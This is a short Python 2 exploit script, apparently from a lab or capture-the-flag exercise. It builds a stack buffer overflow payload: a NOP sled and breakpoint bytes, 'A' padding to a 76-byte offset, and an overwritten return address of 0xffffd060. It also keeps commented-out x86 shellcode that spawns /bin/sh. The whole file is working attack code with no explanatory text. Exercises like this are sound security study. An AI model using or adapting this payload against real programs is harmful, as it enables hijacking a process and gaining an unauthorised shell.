"""
EIP = 76
buffer = 0xffffd060
"""

nop_opcode = chr(0x90)
break_opcode = chr(0xcc)

buffer_location = chr(0x60) + chr(0xd0) + chr(0xff) + chr(0xff)



shellcode = nop_opcode * 10
shellcode += break_opcode * 10

"""
shellcode = chr(0x31) + chr(0xc0) + chr(0x50) + chr(0x68) + chr(0x2f) \
			+ chr(0x2f) + chr(0x73) + chr(0x68) + chr(0x68) + chr(0x2f) + \
			chr(0x62) + chr(0x69) + chr(0x6e) + chr(0x89) + chr(0xe3) + chr(0x50)\
			 + chr(0x53) + chr(0x89) + chr(0xe1) + chr(0xb0) + chr(0x0b) + \
			 chr(0xcd) + chr(0x80)
"""

#print "Filling with %d shit" % (76 - len(shellcode))
shellcode += 'A' * (76 - len(shellcode))
shellcode += buffer_location

print shellcode